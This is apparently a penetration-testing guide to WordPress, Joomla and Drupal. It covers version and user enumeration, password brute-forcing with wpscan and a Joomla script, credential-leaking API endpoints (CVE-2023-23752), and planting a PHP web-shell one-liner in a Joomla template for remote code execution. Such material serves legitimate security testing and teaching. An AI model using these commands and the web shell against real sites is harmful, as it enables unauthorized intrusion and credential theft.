---
description: How to test for security flaws in Content Management Systems
---

# Guide



## Wordpress



### Enumeration

Version: View the source code and search for 'wordpress' or look for 'style.min.css'\
Plugins: look for $$/wp-content/plugins/$$ if there is a directory listing vulnerability then we can see the plugins or else we have to fuzz the directory  `/wp-content/plugins/FUZZ` \
Upload File: uploaded files go to `/wp-content/uploads/2024/08/a.txt`  (year/month)\
Login folders (may be renamed to hide it):

* `/wp-admin/login.php`
* `/wp-admin/wp-login.php`
* `/login.php`
* `/wp-login.php`

### Users <a href="#users" id="users"></a>

**ID Brute**

You get valid users from a WordPress site by Brute Forcing users IDs:

```
curl -s -I -X GET http://blog.example.com/?author=1
```

If the responses are **200** or **30X**, that means that the id is **valid**. If the the response is **400**, then the id is **invalid**.

**wp-json**

You can also try to get information about the users by querying:

```
curl http://blog.example.com/wp-json/wp/v2/users
```

Another `/wp-json/` endpoint that can reveal some information about users is:

```
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```

This endpoint only exposes users that have made a post&#x20;

_`/wp-json/wp/v2/pages`_ could leak IP addresses.



**Login username enumeration**

When login in _`/wp-login.php`_ the message is different is the indicated username exists or not.

#### Automatic Tools <a href="#automatic-tools" id="automatic-tools"></a>

{% code overflow="wrap" lineNumbers="true" %}
```
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0".
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs).
#You can try to bruteforce the admin user using wpscan with "-U admin".
```
{% endcode %}

## Joomla

### Enumeration <a href="#discovery-footprinting" id="discovery-footprinting"></a>

* Check the **meta**

```
curl https://www.joomla.org/ | grep Joomla | grep generator

<meta name="generator" content="Joomla! - Open Source Content Management" />
```

* README.txt

{% code overflow="wrap" %}
```
1- What is this?
	* This is a Joomla! installation/upgrade package to version 3.x
	* Joomla! Official site: https://www.joomla.org
	* Joomla! 3.9 version history - https://docs.joomla.org/Special:MyLanguage/Joomla_3.9_version_history
	* Detailed changes in the Changelog: https://github.com/joomla/joomla-cms/commits/staging
```
{% endcode %}

**Version**

* In **/administrator/manifests/files/joomla.xml** you can see the version.
* In **/language/en-GB/en-GB.xml** you can get the version of Joomla.
* In **plugins/system/cache/cache.xml** you can see an approximate version.

#### Automatic <a href="#automatic" id="automatic"></a>

```
droopescan scan joomla --url http://joomla-site.local/
```

#### API Unauthenticated Information Disclosure: <a href="#api-unauthenticated-information-disclosure" id="api-unauthenticated-information-disclosure"></a>

Versions From 4.0.0 to 4.2.7 are vulnerable to Unauthenticated information disclosure (CVE-2023-23752) that will dump creds and other information.

* Users: `http://<host>/api/v1/users?public=true`
* Config File: `http://<host>/api/index.php/v1/config/application?public=true`

### Brute-Force <a href="#brute-force" id="brute-force"></a>

You can use this [script](https://github.com/ajnik/joomla-bruteforce) to attempt to brute force the login.

{% code overflow="wrap" %}
```
sudo python3 joomla-brute.py -u http://joomla-site.local/ -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
 
admin:admin
```
{% endcode %}

### RCE <a href="#rce" id="rce"></a>

If you managed to get **admin credentials** you can **RCE inside of it** by adding a snippet of **PHP code** to gain **RCE**. We can do this by **customizing** a **template**.

1. **Click** on _`Templates`_ on the bottom left under `Configuration` to pull up the templates menu.
2. **Click** on a **template** name. Let's choose _`protostar`_ under the `Template` column header. This will bring us to the _`Templates: Customise`_ page.
3. Finally, you can click on a page to pull up the **page source**. Let's choose the _`error.php`_ page. We'll add a **PHP one-liner to gain code execution** as follows:
   1. _`system($_GET['cmd']);`_
4. **Save & Close**
5. `curl -s http://joomla-site.local/templates/protostar/error.php?cmd=id`

## DRUPAL

### Enumeration <a href="#discovery" id="discovery"></a>

* Check **meta**

```
curl https://www.drupal.org/ | grep 'content="Drupal'
```

* **Node**: Drupal **indexes its content using nodes**. A node can **hold anything** such as a blog post, poll, article, etc. The page URIs are usually of the form `/node/<nodeid>`.

```
curl drupal-site.com/node/1
```

Drupal supports **three types of users** by default:

1. _`Administrator`_: This user has complete control over the Drupal website.
2. _`Authenticated User`_: These users can log in to the website and perform operations such as adding and editing articles based on their permissions.
3. _`Anonymous`_: All website visitors are designated as anonymous. By default, these users are only allowed to read posts.

#### Version <a href="#version" id="version"></a>

Check `/CHANGELOG.txt`

{% hint style="warning" %}
Newer installs of Drupal by default block access to the `CHANGELOG.txt` and `README.txt` files.
{% endhint %}

#### Username enumeration <a href="#username-enumeration" id="username-enumeration"></a>

**Register**

In _/user/register_ just try to create a username and if the name is already taken it will be notified.

**Request new password**

If you request a new password for an existing username:

![](https://book.hacktricks.xyz/\~gitbook/image?url=https%3A%2F%2F129538173-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-L\_2uGJGU7AVNRcqRvEi%252F-M6KEGZVfXabQu4BekYj%252F-M6KEpyUUAMQPM-4\_iqs%252Fimage.png%3Falt%3Dmedia%26token%3Dcbaa1955-a1a0-43c9-8d42-903fb4131402\&width=768\&dpr=4\&quality=100\&sign=b5eaef7a3523d703c2f56ccac0f59e5af77f24a922a1e6a67ea68b69712276b2)

If you request a new password for a non-existent username:

![](https://book.hacktricks.xyz/\~gitbook/image?url=https%3A%2F%2F129538173-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-L\_2uGJGU7AVNRcqRvEi%252F-M6KEGZVfXabQu4BekYj%252F-M6KEzUg1O8OA8Ijhpzq%252Fimage.png%3Falt%3Dmedia%26token%3D7efd97c6-9fc6-48d5-a205-132ec6aaede3\&width=768\&dpr=4\&quality=100\&sign=4e5ade7f1d0cec9ceaa38624588624dd9ee09093bd169034455ae28f40243f67)

#### Get number of users <a href="#get-number-of-users" id="get-number-of-users"></a>

Accessing _/user/\<number>_ you can see the number of existing users, in this case is 2 as _/users/3_ returns a not found error:

![](https://book.hacktricks.xyz/\~gitbook/image?url=https%3A%2F%2F129538173-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-L\_2uGJGU7AVNRcqRvEi%252F-M6KEGZVfXabQu4BekYj%252F-M6KFGkeiEqBuqypkNJZ%252Fimage.png%3Falt%3Dmedia%26token%3D8d28ce06-b123-42e7-b974-c86643c94136\&width=768\&dpr=4\&quality=100\&sign=c2c5a1ed71f00c93b0d15097c4d0f7a4f54b40d48fea85a4e1ecc677fd8cf93b)![](https://book.hacktricks.xyz/\~gitbook/image?url=https%3A%2F%2F129538173-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-L\_2uGJGU7AVNRcqRvEi%252F-M6KEGZVfXabQu4BekYj%252F-M6KFKtUrYwmC845RYdD%252Fimage.png%3Falt%3Dmedia%26token%3Dd22e3bda-7a42-4937-8614-4a1ed32cc7a4\&width=768\&dpr=4\&quality=100\&sign=1c967869a7f7907e752fed7ccb27ac18e1675d5287205b357c838a7f64000309)

#### Hidden pages <a href="#hidden-pages" id="hidden-pages"></a>

**Fuzz `/node/$` where `$` is a number** (from 1 to 500 for example). You could find **hidden pages** (test, dev) which are not referenced by the search engines.



**Installed modules info**

```
#From https://twitter.com/intigriti/status/1439192489093644292/photo/1
#Get info on installed modules
curl https://example.com/config/sync/core.extension.yml
curl https://example.com/core/core.services.yml

# Download content from files exposed in the previous step
curl https://example.com/config/sync/swiftmailer.transport.yml
```

#### Automatic <a href="#automatic" id="automatic"></a>

```
droopescan scan drupal -u http://drupal-site.local
```



